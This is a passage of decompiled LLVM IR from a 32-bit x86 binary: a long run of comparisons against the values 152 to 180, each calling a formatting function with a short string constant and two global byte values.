  store i32 %v2_804bad7, i32* @ebx, align 4
  %v5_804bade = call i32 @function_8048b5b(i32 %v2_804bad7, i32 ptrtoint ([13 x i8]* @global_var_805a6c8.194 to i32), i32 %v1_804bac8, i32 %v1_804babc)
  br label %dec_label_pc_804bae6

dec_label_pc_804bae6:                             ; preds = %dec_label_pc_804bab3, %dec_label_pc_804babc
  %v12_804bae6 = icmp eq i32 %v11_8049e19, 152
  %v1_804baed = icmp eq i1 %v12_804bae6, false
  br i1 %v1_804baed, label %dec_label_pc_804bb19, label %dec_label_pc_804baef

dec_label_pc_804baef:                             ; preds = %dec_label_pc_804bae6
  %v0_804baef = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804baef = zext i8 %v0_804baef to i32
  store i32 %v1_804baef, i32* @edx, align 4
  %v0_804bafb = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bafb = zext i8 %v0_804bafb to i32
  %v2_804bb0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb0a, i32* @ebx, align 4
  %v5_804bb11 = call i32 @function_8048b5b(i32 %v2_804bb0a, i32 ptrtoint ([13 x i8]* @global_var_805a6d5.195 to i32), i32 %v1_804bafb, i32 %v1_804baef)
  br label %dec_label_pc_804bb19

dec_label_pc_804bb19:                             ; preds = %dec_label_pc_804bae6, %dec_label_pc_804baef
  %v12_804bb19 = icmp eq i32 %v11_8049e19, 153
  %v1_804bb20 = icmp eq i1 %v12_804bb19, false
  br i1 %v1_804bb20, label %dec_label_pc_804bb4c, label %dec_label_pc_804bb22

dec_label_pc_804bb22:                             ; preds = %dec_label_pc_804bb19
  %v0_804bb22 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bb22 = zext i8 %v0_804bb22 to i32
  store i32 %v1_804bb22, i32* @edx, align 4
  %v0_804bb2e = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bb2e = zext i8 %v0_804bb2e to i32
  %v2_804bb3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb3d, i32* @ebx, align 4
  %v5_804bb44 = call i32 @function_8048b5b(i32 %v2_804bb3d, i32 ptrtoint ([13 x i8]* @global_var_805a6e2.196 to i32), i32 %v1_804bb2e, i32 %v1_804bb22)
  br label %dec_label_pc_804bb4c

dec_label_pc_804bb4c:                             ; preds = %dec_label_pc_804bb19, %dec_label_pc_804bb22
  %v12_804bb4c = icmp eq i32 %v11_8049e19, 154
  %v1_804bb53 = icmp eq i1 %v12_804bb4c, false
  br i1 %v1_804bb53, label %dec_label_pc_804bb7f, label %dec_label_pc_804bb55

dec_label_pc_804bb55:                             ; preds = %dec_label_pc_804bb4c
  %v0_804bb55 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bb55 = zext i8 %v0_804bb55 to i32
  store i32 %v1_804bb55, i32* @edx, align 4
  %v0_804bb61 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bb61 = zext i8 %v0_804bb61 to i32
  %v2_804bb70 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb70, i32* @ebx, align 4
  %v5_804bb77 = call i32 @function_8048b5b(i32 %v2_804bb70, i32 ptrtoint ([13 x i8]* @global_var_805a6ef.197 to i32), i32 %v1_804bb61, i32 %v1_804bb55)
  br label %dec_label_pc_804bb7f

dec_label_pc_804bb7f:                             ; preds = %dec_label_pc_804bb4c, %dec_label_pc_804bb55
  %v12_804bb7f = icmp eq i32 %v11_8049e19, 155
  %v1_804bb86 = icmp eq i1 %v12_804bb7f, false
  br i1 %v1_804bb86, label %dec_label_pc_804bbb2, label %dec_label_pc_804bb88

dec_label_pc_804bb88:                             ; preds = %dec_label_pc_804bb7f
  %v0_804bb88 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bb88 = zext i8 %v0_804bb88 to i32
  store i32 %v1_804bb88, i32* @edx, align 4
  %v0_804bb94 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bb94 = zext i8 %v0_804bb94 to i32
  %v2_804bba3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bba3, i32* @ebx, align 4
  %v5_804bbaa = call i32 @function_8048b5b(i32 %v2_804bba3, i32 ptrtoint ([13 x i8]* @global_var_805a6fc.198 to i32), i32 %v1_804bb94, i32 %v1_804bb88)
  br label %dec_label_pc_804bbb2

dec_label_pc_804bbb2:                             ; preds = %dec_label_pc_804bb7f, %dec_label_pc_804bb88
  %v12_804bbb2 = icmp eq i32 %v11_8049e19, 156
  %v1_804bbb9 = icmp eq i1 %v12_804bbb2, false
  br i1 %v1_804bbb9, label %dec_label_pc_804bbe5, label %dec_label_pc_804bbbb

dec_label_pc_804bbbb:                             ; preds = %dec_label_pc_804bbb2
  %v0_804bbbb = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bbbb = zext i8 %v0_804bbbb to i32
  store i32 %v1_804bbbb, i32* @edx, align 4
  %v0_804bbc7 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bbc7 = zext i8 %v0_804bbc7 to i32
  %v2_804bbd6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbd6, i32* @ebx, align 4
  %v5_804bbdd = call i32 @function_8048b5b(i32 %v2_804bbd6, i32 ptrtoint ([13 x i8]* @global_var_805a709.199 to i32), i32 %v1_804bbc7, i32 %v1_804bbbb)
  br label %dec_label_pc_804bbe5

dec_label_pc_804bbe5:                             ; preds = %dec_label_pc_804bbb2, %dec_label_pc_804bbbb
  %v12_804bbe5 = icmp eq i32 %v11_8049e19, 157
  %v1_804bbec = icmp eq i1 %v12_804bbe5, false
  br i1 %v1_804bbec, label %dec_label_pc_804bc18, label %dec_label_pc_804bbee

dec_label_pc_804bbee:                             ; preds = %dec_label_pc_804bbe5
  %v0_804bbee = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bbee = zext i8 %v0_804bbee to i32
  store i32 %v1_804bbee, i32* @edx, align 4
  %v0_804bbfa = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bbfa = zext i8 %v0_804bbfa to i32
  %v2_804bc09 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc09, i32* @ebx, align 4
  %v5_804bc10 = call i32 @function_8048b5b(i32 %v2_804bc09, i32 ptrtoint ([13 x i8]* @global_var_805a716.200 to i32), i32 %v1_804bbfa, i32 %v1_804bbee)
  br label %dec_label_pc_804bc18

dec_label_pc_804bc18:                             ; preds = %dec_label_pc_804bbe5, %dec_label_pc_804bbee
  %v12_804bc18 = icmp eq i32 %v11_8049e19, 158
  %v1_804bc1f = icmp eq i1 %v12_804bc18, false
  br i1 %v1_804bc1f, label %dec_label_pc_804bc4b, label %dec_label_pc_804bc21

dec_label_pc_804bc21:                             ; preds = %dec_label_pc_804bc18
  %v0_804bc21 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bc21 = zext i8 %v0_804bc21 to i32
  store i32 %v1_804bc21, i32* @edx, align 4
  %v0_804bc2d = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bc2d = zext i8 %v0_804bc2d to i32
  %v2_804bc3c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc3c, i32* @ebx, align 4
  %v5_804bc43 = call i32 @function_8048b5b(i32 %v2_804bc3c, i32 ptrtoint ([13 x i8]* @global_var_805a723.201 to i32), i32 %v1_804bc2d, i32 %v1_804bc21)
  br label %dec_label_pc_804bc4b

dec_label_pc_804bc4b:                             ; preds = %dec_label_pc_804bc18, %dec_label_pc_804bc21
  %v12_804bc4b = icmp eq i32 %v11_8049e19, 159
  %v1_804bc52 = icmp eq i1 %v12_804bc4b, false
  br i1 %v1_804bc52, label %dec_label_pc_804bc7e, label %dec_label_pc_804bc54

dec_label_pc_804bc54:                             ; preds = %dec_label_pc_804bc4b
  %v0_804bc54 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bc54 = zext i8 %v0_804bc54 to i32
  store i32 %v1_804bc54, i32* @edx, align 4
  %v0_804bc60 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bc60 = zext i8 %v0_804bc60 to i32
  %v2_804bc6f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc6f, i32* @ebx, align 4
  %v5_804bc76 = call i32 @function_8048b5b(i32 %v2_804bc6f, i32 ptrtoint ([13 x i8]* @global_var_805a730.202 to i32), i32 %v1_804bc60, i32 %v1_804bc54)
  br label %dec_label_pc_804bc7e

dec_label_pc_804bc7e:                             ; preds = %dec_label_pc_804bc4b, %dec_label_pc_804bc54
  %v9_804bc7e = icmp eq i32 %v11_8049e19, 160
  %v1_804bc85 = icmp eq i1 %v9_804bc7e, false
  br i1 %v1_804bc85, label %dec_label_pc_804bcb1, label %dec_label_pc_804bc87

dec_label_pc_804bc87:                             ; preds = %dec_label_pc_804bc7e
  %v0_804bc87 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bc87 = zext i8 %v0_804bc87 to i32
  store i32 %v1_804bc87, i32* @edx, align 4
  %v0_804bc93 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bc93 = zext i8 %v0_804bc93 to i32
  %v2_804bca2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bca2, i32* @ebx, align 4
  %v5_804bca9 = call i32 @function_8048b5b(i32 %v2_804bca2, i32 ptrtoint ([13 x i8]* @global_var_805a73d.203 to i32), i32 %v1_804bc93, i32 %v1_804bc87)
  br label %dec_label_pc_804bcb1

dec_label_pc_804bcb1:                             ; preds = %dec_label_pc_804bc7e, %dec_label_pc_804bc87
  %v12_804bcb1 = icmp eq i32 %v11_8049e19, 161
  %v1_804bcb8 = icmp eq i1 %v12_804bcb1, false
  br i1 %v1_804bcb8, label %dec_label_pc_804bce4, label %dec_label_pc_804bcba

dec_label_pc_804bcba:                             ; preds = %dec_label_pc_804bcb1
  %v0_804bcba = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bcba = zext i8 %v0_804bcba to i32
  store i32 %v1_804bcba, i32* @edx, align 4
  %v0_804bcc6 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bcc6 = zext i8 %v0_804bcc6 to i32
  %v2_804bcd5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcd5, i32* @ebx, align 4
  %v5_804bcdc = call i32 @function_8048b5b(i32 %v2_804bcd5, i32 ptrtoint ([12 x i8]* @global_var_805a74a.204 to i32), i32 %v1_804bcc6, i32 %v1_804bcba)
  br label %dec_label_pc_804bce4

dec_label_pc_804bce4:                             ; preds = %dec_label_pc_804bcb1, %dec_label_pc_804bcba
  %v12_804bce4 = icmp eq i32 %v11_8049e19, 162
  %v1_804bceb = icmp eq i1 %v12_804bce4, false
  br i1 %v1_804bceb, label %dec_label_pc_804bd17, label %dec_label_pc_804bced

dec_label_pc_804bced:                             ; preds = %dec_label_pc_804bce4
  %v0_804bced = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bced = zext i8 %v0_804bced to i32
  store i32 %v1_804bced, i32* @edx, align 4
  %v0_804bcf9 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bcf9 = zext i8 %v0_804bcf9 to i32
  %v2_804bd08 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd08, i32* @ebx, align 4
  %v5_804bd0f = call i32 @function_8048b5b(i32 %v2_804bd08, i32 ptrtoint ([13 x i8]* @global_var_805a756.205 to i32), i32 %v1_804bcf9, i32 %v1_804bced)
  br label %dec_label_pc_804bd17

dec_label_pc_804bd17:                             ; preds = %dec_label_pc_804bce4, %dec_label_pc_804bced
  %v12_804bd17 = icmp eq i32 %v11_8049e19, 163
  %v1_804bd1e = icmp eq i1 %v12_804bd17, false
  br i1 %v1_804bd1e, label %dec_label_pc_804bd4a, label %dec_label_pc_804bd20

dec_label_pc_804bd20:                             ; preds = %dec_label_pc_804bd17
  %v0_804bd20 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bd20 = zext i8 %v0_804bd20 to i32
  store i32 %v1_804bd20, i32* @edx, align 4
  %v0_804bd2c = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bd2c = zext i8 %v0_804bd2c to i32
  %v2_804bd3b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd3b, i32* @ebx, align 4
  %v5_804bd42 = call i32 @function_8048b5b(i32 %v2_804bd3b, i32 ptrtoint ([13 x i8]* @global_var_805a763.206 to i32), i32 %v1_804bd2c, i32 %v1_804bd20)
  br label %dec_label_pc_804bd4a

dec_label_pc_804bd4a:                             ; preds = %dec_label_pc_804bd17, %dec_label_pc_804bd20
  %v12_804bd4a = icmp eq i32 %v11_8049e19, 164
  %v1_804bd51 = icmp eq i1 %v12_804bd4a, false
  br i1 %v1_804bd51, label %dec_label_pc_804bd7d, label %dec_label_pc_804bd53

dec_label_pc_804bd53:                             ; preds = %dec_label_pc_804bd4a
  %v0_804bd53 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bd53 = zext i8 %v0_804bd53 to i32
  store i32 %v1_804bd53, i32* @edx, align 4
  %v0_804bd5f = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bd5f = zext i8 %v0_804bd5f to i32
  %v2_804bd6e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd6e, i32* @ebx, align 4
  %v5_804bd75 = call i32 @function_8048b5b(i32 %v2_804bd6e, i32 ptrtoint ([13 x i8]* @global_var_805a770.207 to i32), i32 %v1_804bd5f, i32 %v1_804bd53)
  br label %dec_label_pc_804bd7d

dec_label_pc_804bd7d:                             ; preds = %dec_label_pc_804bd4a, %dec_label_pc_804bd53
  %v12_804bd7d = icmp eq i32 %v11_8049e19, 165
  %v1_804bd84 = icmp eq i1 %v12_804bd7d, false
  br i1 %v1_804bd84, label %dec_label_pc_804bdb0, label %dec_label_pc_804bd86

dec_label_pc_804bd86:                             ; preds = %dec_label_pc_804bd7d
  %v0_804bd86 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bd86 = zext i8 %v0_804bd86 to i32
  store i32 %v1_804bd86, i32* @edx, align 4
  %v0_804bd92 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bd92 = zext i8 %v0_804bd92 to i32
  %v2_804bda1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bda1, i32* @ebx, align 4
  %v5_804bda8 = call i32 @function_8048b5b(i32 %v2_804bda1, i32 ptrtoint ([12 x i8]* @global_var_805a77d.208 to i32), i32 %v1_804bd92, i32 %v1_804bd86)
  br label %dec_label_pc_804bdb0

dec_label_pc_804bdb0:                             ; preds = %dec_label_pc_804bd7d, %dec_label_pc_804bd86
  %v12_804bdb0 = icmp eq i32 %v11_8049e19, 166
  %v1_804bdb7 = icmp eq i1 %v12_804bdb0, false
  br i1 %v1_804bdb7, label %dec_label_pc_804bde3, label %dec_label_pc_804bdb9

dec_label_pc_804bdb9:                             ; preds = %dec_label_pc_804bdb0
  %v0_804bdb9 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bdb9 = zext i8 %v0_804bdb9 to i32
  store i32 %v1_804bdb9, i32* @edx, align 4
  %v0_804bdc5 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bdc5 = zext i8 %v0_804bdc5 to i32
  %v2_804bdd4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdd4, i32* @ebx, align 4
  %v5_804bddb = call i32 @function_8048b5b(i32 %v2_804bdd4, i32 ptrtoint ([13 x i8]* @global_var_805a789.209 to i32), i32 %v1_804bdc5, i32 %v1_804bdb9)
  br label %dec_label_pc_804bde3

dec_label_pc_804bde3:                             ; preds = %dec_label_pc_804bdb0, %dec_label_pc_804bdb9
  %v12_804bde3 = icmp eq i32 %v11_8049e19, 167
  %v1_804bdea = icmp eq i1 %v12_804bde3, false
  br i1 %v1_804bdea, label %dec_label_pc_804be16, label %dec_label_pc_804bdec

dec_label_pc_804bdec:                             ; preds = %dec_label_pc_804bde3
  %v0_804bdec = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bdec = zext i8 %v0_804bdec to i32
  store i32 %v1_804bdec, i32* @edx, align 4
  %v0_804bdf8 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bdf8 = zext i8 %v0_804bdf8 to i32
  %v2_804be07 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be07, i32* @ebx, align 4
  %v5_804be0e = call i32 @function_8048b5b(i32 %v2_804be07, i32 ptrtoint ([14 x i8]* @global_var_805a796.210 to i32), i32 %v1_804bdf8, i32 %v1_804bdec)
  br label %dec_label_pc_804be16

dec_label_pc_804be16:                             ; preds = %dec_label_pc_804bde3, %dec_label_pc_804bdec
  %v12_804be16 = icmp eq i32 %v11_8049e19, 168
  %v1_804be1d = icmp eq i1 %v12_804be16, false
  br i1 %v1_804be1d, label %dec_label_pc_804be49, label %dec_label_pc_804be1f

dec_label_pc_804be1f:                             ; preds = %dec_label_pc_804be16
  %v0_804be1f = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804be1f = zext i8 %v0_804be1f to i32
  store i32 %v1_804be1f, i32* @edx, align 4
  %v0_804be2b = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804be2b = zext i8 %v0_804be2b to i32
  %v2_804be3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be3a, i32* @ebx, align 4
  %v5_804be41 = call i32 @function_8048b5b(i32 %v2_804be3a, i32 ptrtoint ([14 x i8]* @global_var_805a7a4.211 to i32), i32 %v1_804be2b, i32 %v1_804be1f)
  br label %dec_label_pc_804be49

dec_label_pc_804be49:                             ; preds = %dec_label_pc_804be16, %dec_label_pc_804be1f
  %v12_804be49 = icmp eq i32 %v11_8049e19, 169
  %v1_804be50 = icmp eq i1 %v12_804be49, false
  br i1 %v1_804be50, label %dec_label_pc_804be7c, label %dec_label_pc_804be52

dec_label_pc_804be52:                             ; preds = %dec_label_pc_804be49
  %v0_804be52 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804be52 = zext i8 %v0_804be52 to i32
  store i32 %v1_804be52, i32* @edx, align 4
  %v0_804be5e = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804be5e = zext i8 %v0_804be5e to i32
  %v2_804be6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be6d, i32* @ebx, align 4
  %v5_804be74 = call i32 @function_8048b5b(i32 %v2_804be6d, i32 ptrtoint ([13 x i8]* @global_var_805a7b2.212 to i32), i32 %v1_804be5e, i32 %v1_804be52)
  br label %dec_label_pc_804be7c

dec_label_pc_804be7c:                             ; preds = %dec_label_pc_804be49, %dec_label_pc_804be52
  %v12_804be7c = icmp eq i32 %v11_8049e19, 170
  %v1_804be83 = icmp eq i1 %v12_804be7c, false
  br i1 %v1_804be83, label %dec_label_pc_804beaf, label %dec_label_pc_804be85

dec_label_pc_804be85:                             ; preds = %dec_label_pc_804be7c
  %v0_804be85 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804be85 = zext i8 %v0_804be85 to i32
  store i32 %v1_804be85, i32* @edx, align 4
  %v0_804be91 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804be91 = zext i8 %v0_804be91 to i32
  %v2_804bea0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bea0, i32* @ebx, align 4
  %v5_804bea7 = call i32 @function_8048b5b(i32 %v2_804bea0, i32 ptrtoint ([14 x i8]* @global_var_805a7bf.213 to i32), i32 %v1_804be91, i32 %v1_804be85)
  br label %dec_label_pc_804beaf

dec_label_pc_804beaf:                             ; preds = %dec_label_pc_804be7c, %dec_label_pc_804be85
  %v12_804beaf = icmp eq i32 %v11_8049e19, 171
  %v1_804beb6 = icmp eq i1 %v12_804beaf, false
  br i1 %v1_804beb6, label %dec_label_pc_804bee2, label %dec_label_pc_804beb8

dec_label_pc_804beb8:                             ; preds = %dec_label_pc_804beaf
  %v0_804beb8 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804beb8 = zext i8 %v0_804beb8 to i32
  store i32 %v1_804beb8, i32* @edx, align 4
  %v0_804bec4 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bec4 = zext i8 %v0_804bec4 to i32
  %v2_804bed3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bed3, i32* @ebx, align 4
  %v5_804beda = call i32 @function_8048b5b(i32 %v2_804bed3, i32 ptrtoint ([14 x i8]* @global_var_805a7cd.214 to i32), i32 %v1_804bec4, i32 %v1_804beb8)
  br label %dec_label_pc_804bee2

dec_label_pc_804bee2:                             ; preds = %dec_label_pc_804beaf, %dec_label_pc_804beb8
  %v12_804bee2 = icmp eq i32 %v11_8049e19, 172
  %v1_804bee9 = icmp eq i1 %v12_804bee2, false
  br i1 %v1_804bee9, label %dec_label_pc_804bf15, label %dec_label_pc_804beeb

dec_label_pc_804beeb:                             ; preds = %dec_label_pc_804bee2
  %v0_804beeb = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804beeb = zext i8 %v0_804beeb to i32
  store i32 %v1_804beeb, i32* @edx, align 4
  %v0_804bef7 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bef7 = zext i8 %v0_804bef7 to i32
  %v2_804bf06 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf06, i32* @ebx, align 4
  %v5_804bf0d = call i32 @function_8048b5b(i32 %v2_804bf06, i32 ptrtoint ([13 x i8]* @global_var_805a7db.215 to i32), i32 %v1_804bef7, i32 %v1_804beeb)
  br label %dec_label_pc_804bf15

dec_label_pc_804bf15:                             ; preds = %dec_label_pc_804bee2, %dec_label_pc_804beeb
  %v12_804bf15 = icmp eq i32 %v11_8049e19, 173
  %v1_804bf1c = icmp eq i1 %v12_804bf15, false
  br i1 %v1_804bf1c, label %dec_label_pc_804bf48, label %dec_label_pc_804bf1e

dec_label_pc_804bf1e:                             ; preds = %dec_label_pc_804bf15
  %v0_804bf1e = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bf1e = zext i8 %v0_804bf1e to i32
  store i32 %v1_804bf1e, i32* @edx, align 4
  %v0_804bf2a = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bf2a = zext i8 %v0_804bf2a to i32
  %v2_804bf39 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf39, i32* @ebx, align 4
  %v5_804bf40 = call i32 @function_8048b5b(i32 %v2_804bf39, i32 ptrtoint ([14 x i8]* @global_var_805a7e8.216 to i32), i32 %v1_804bf2a, i32 %v1_804bf1e)
  br label %dec_label_pc_804bf48

dec_label_pc_804bf48:                             ; preds = %dec_label_pc_804bf15, %dec_label_pc_804bf1e
  %v12_804bf48 = icmp eq i32 %v11_8049e19, 174
  %v1_804bf4f = icmp eq i1 %v12_804bf48, false
  br i1 %v1_804bf4f, label %dec_label_pc_804bf7b, label %dec_label_pc_804bf51

dec_label_pc_804bf51:                             ; preds = %dec_label_pc_804bf48
  %v0_804bf51 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bf51 = zext i8 %v0_804bf51 to i32
  store i32 %v1_804bf51, i32* @edx, align 4
  %v0_804bf5d = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bf5d = zext i8 %v0_804bf5d to i32
  %v2_804bf6c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf6c, i32* @ebx, align 4
  %v5_804bf73 = call i32 @function_8048b5b(i32 %v2_804bf6c, i32 ptrtoint ([13 x i8]* @global_var_805a7f6.217 to i32), i32 %v1_804bf5d, i32 %v1_804bf51)
  br label %dec_label_pc_804bf7b

dec_label_pc_804bf7b:                             ; preds = %dec_label_pc_804bf48, %dec_label_pc_804bf51
  %v12_804bf7b = icmp eq i32 %v11_8049e19, 175
  %v1_804bf82 = icmp eq i1 %v12_804bf7b, false
  br i1 %v1_804bf82, label %dec_label_pc_804bfae, label %dec_label_pc_804bf84

dec_label_pc_804bf84:                             ; preds = %dec_label_pc_804bf7b
  %v0_804bf84 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bf84 = zext i8 %v0_804bf84 to i32
  store i32 %v1_804bf84, i32* @edx, align 4
  %v0_804bf90 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bf90 = zext i8 %v0_804bf90 to i32
  %v2_804bf9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf9f, i32* @ebx, align 4
  %v5_804bfa6 = call i32 @function_8048b5b(i32 %v2_804bf9f, i32 ptrtoint ([14 x i8]* @global_var_805a803.218 to i32), i32 %v1_804bf90, i32 %v1_804bf84)
  br label %dec_label_pc_804bfae

dec_label_pc_804bfae:                             ; preds = %dec_label_pc_804bf7b, %dec_label_pc_804bf84
  %v9_804bfae = icmp eq i32 %v11_8049e19, 176
  %v1_804bfb5 = icmp eq i1 %v9_804bfae, false
  br i1 %v1_804bfb5, label %dec_label_pc_804bfe1, label %dec_label_pc_804bfb7

dec_label_pc_804bfb7:                             ; preds = %dec_label_pc_804bfae
  %v0_804bfb7 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bfb7 = zext i8 %v0_804bfb7 to i32
  store i32 %v1_804bfb7, i32* @edx, align 4
  %v0_804bfc3 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bfc3 = zext i8 %v0_804bfc3 to i32
  %v2_804bfd2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfd2, i32* @ebx, align 4
  %v5_804bfd9 = call i32 @function_8048b5b(i32 %v2_804bfd2, i32 ptrtoint ([14 x i8]* @global_var_805a811.219 to i32), i32 %v1_804bfc3, i32 %v1_804bfb7)
  br label %dec_label_pc_804bfe1

dec_label_pc_804bfe1:                             ; preds = %dec_label_pc_804bfae, %dec_label_pc_804bfb7
  %v12_804bfe1 = icmp eq i32 %v11_8049e19, 177
  %v1_804bfe8 = icmp eq i1 %v12_804bfe1, false
  br i1 %v1_804bfe8, label %dec_label_pc_804c014, label %dec_label_pc_804bfea

dec_label_pc_804bfea:                             ; preds = %dec_label_pc_804bfe1
  %v0_804bfea = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804bfea = zext i8 %v0_804bfea to i32
  store i32 %v1_804bfea, i32* @edx, align 4
  %v0_804bff6 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bff6 = zext i8 %v0_804bff6 to i32
  %v2_804c005 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c005, i32* @ebx, align 4
  %v5_804c00c = call i32 @function_8048b5b(i32 %v2_804c005, i32 ptrtoint ([14 x i8]* @global_var_805a81f.220 to i32), i32 %v1_804bff6, i32 %v1_804bfea)
  br label %dec_label_pc_804c014

dec_label_pc_804c014:                             ; preds = %dec_label_pc_804bfe1, %dec_label_pc_804bfea
  %v12_804c014 = icmp eq i32 %v11_8049e19, 178
  %v1_804c01b = icmp eq i1 %v12_804c014, false
  br i1 %v1_804c01b, label %dec_label_pc_804c047, label %dec_label_pc_804c01d

dec_label_pc_804c01d:                             ; preds = %dec_label_pc_804c014
  %v0_804c01d = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c01d = zext i8 %v0_804c01d to i32
  store i32 %v1_804c01d, i32* @edx, align 4
  %v0_804c029 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c029 = zext i8 %v0_804c029 to i32
  %v2_804c038 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c038, i32* @ebx, align 4
  %v5_804c03f = call i32 @function_8048b5b(i32 %v2_804c038, i32 ptrtoint ([14 x i8]* @global_var_805a82d.221 to i32), i32 %v1_804c029, i32 %v1_804c01d)
  br label %dec_label_pc_804c047

dec_label_pc_804c047:                             ; preds = %dec_label_pc_804c014, %dec_label_pc_804c01d
  %v12_804c047 = icmp eq i32 %v11_8049e19, 179
  %v1_804c04e = icmp eq i1 %v12_804c047, false
  br i1 %v1_804c04e, label %dec_label_pc_804c07a, label %dec_label_pc_804c050

dec_label_pc_804c050:                             ; preds = %dec_label_pc_804c047
  %v0_804c050 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c050 = zext i8 %v0_804c050 to i32
  store i32 %v1_804c050, i32* @edx, align 4
  %v0_804c05c = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c05c = zext i8 %v0_804c05c to i32
  %v2_804c06b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c06b, i32* @ebx, align 4
  %v5_804c072 = call i32 @function_8048b5b(i32 %v2_804c06b, i32 ptrtoint ([14 x i8]* @global_var_805a796.210 to i32), i32 %v1_804c05c, i32 %v1_804c050)
  br label %dec_label_pc_804c07a

dec_label_pc_804c07a:                             ; preds = %dec_label_pc_804c047, %dec_label_pc_804c050
  %v12_804c07a = icmp eq i32 %v11_8049e19, 180
  %v1_804c081 = icmp eq i1 %v12_804c07a, false
  br i1 %v1_804c081, label %dec_label_pc_804c0ad, label %dec_label_pc_804c083

dec_label_pc_804c083:                             ; preds = %dec_label_pc_804c07a
  %v0_804c083 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c083 = zext i8 %v0_804c083 to i32
  store i32 %v1_804c083, i32* @edx, align 4
  %v0_804c08f = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c08f = zext i8 %v0_804c08f to i32
  %v2_804c09e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c09e, i32* @ebx, align 4
  %v5_804c0a5 = call i32 @function_8048b5b(i32 %v2_804c09e, i32 ptrtoint ([13 x i8]* @global_var_805a83b.222 to i32), i32 %v1_804c08f, i32 %v1_804c083)
  br label %dec_label_pc_804c0ad

dec_label_pc_804c0ad:                             ; preds = %dec_label_pc_804c07a, %dec_label_pc_804c083
